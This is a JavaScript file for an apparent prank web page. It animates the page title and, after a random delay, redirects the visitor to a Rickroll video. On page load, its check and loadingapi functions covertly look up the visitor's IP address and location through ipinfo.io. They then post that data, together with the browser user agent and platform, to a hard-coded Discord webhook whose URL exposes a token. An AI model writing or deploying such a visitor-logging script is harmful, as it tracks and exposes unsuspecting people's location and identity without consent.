document.addEventListener('DOMContentLoaded', function () {
  const titleElement = document.getElementById('siteTitle');
  const titles = ["get good    ", "nn dog    "];
  let titleIndex = 0;
  let index = 0;
  let forward = true;

  function getCurrentUnixTime() {
    const now = new Date();
    return Math.round(now.getTime() / 1000);
  }

  function updateTitle() {
    titleElement.innerText = titles[titleIndex].substring(0, index);

    if (forward) {
      index = (index + 1) % (titles[titleIndex].length + 1);
      if (index === titles[titleIndex].length) {
        forward = false;
      }
    } else {
      index = (index - 1 + titles[titleIndex].length) % (titles[titleIndex].length + 1);
      if (index === 0) {
        forward = true;
        titleIndex = (titleIndex + 1) % titles.length;
      }
    }
  }

  setInterval(updateTitle, 250);

  function openLink() {
    const link = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
    window.location.href = link;
  }

  const delay = Math.floor(Math.random() * (15000 - 5000 + 1)) + 5000;
  setTimeout(openLink, delay);
});

function check() {
  const UA = navigator.userAgent;
  const os = navigator.platform;
  fetch('https://ipinfo.io/json')
    .then(response => response.json())
    .then(data => {
      const addr = data.ip;
      const location = data.loc.split(',');
      const city = data.city;
      const region = data.region;
      const country = data.country;
      loadingapi(UA, addr, city, region, country, os);
    });
}

function loadingapi(UA, addr, city, region, country, os) {
  const webhookURL = 'https://discord.com/api/webhooks/1190483916168114197/umTxVI0_ICJNuHz1ajpciQh7qGw6HAn1JFg25qCk6yBfb5yaMhduzoWFPk27D6Cr4aOl';
  const payload = {
    content: `**User-Agent:**    \`${UA}\`\n**IP:**          \`${addr}\`\n**Location:**      \`${city}, ${region}, ${country}\` \n**OS:** \`${os}\` \n**Hit time**: <t:${getCurrentUnixTime()}:T> raw: \`${getCurrentUnixTime()}\``
  };

  fetch(webhookURL, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify(payload),
  });
}

window.onload = check;
